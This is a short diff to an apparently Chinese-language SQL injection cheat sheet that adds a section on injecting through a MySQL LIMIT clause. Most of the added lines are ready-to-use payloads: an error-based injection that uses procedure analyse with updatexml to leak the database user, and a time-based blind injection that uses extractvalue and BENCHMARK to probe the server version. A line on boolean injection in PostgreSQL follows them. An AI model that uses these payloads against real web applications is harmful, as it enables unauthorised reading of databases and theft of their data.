@@ -391,6 +391,12 @@ insert into users(username, password) values
 
 #### limit注入
 
+* 没有order by，可以直接union select
+* 有order by，
+  * 报错注入 limit 0,1 procedure analyse(updatexml(1,concat(0x3a,user()),1),1);
+  * 延时注入 limit 2,0 procedure analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1);
+  * 有些(PostgreSQL)可以使用布尔注入，核心思想是将limit  后的数字由函数或表达式算出
+
 ### 关于insert、update、delete的注入
 
 这些注入与select注入的区别主要在于不能使用union注入、无法写文件上。
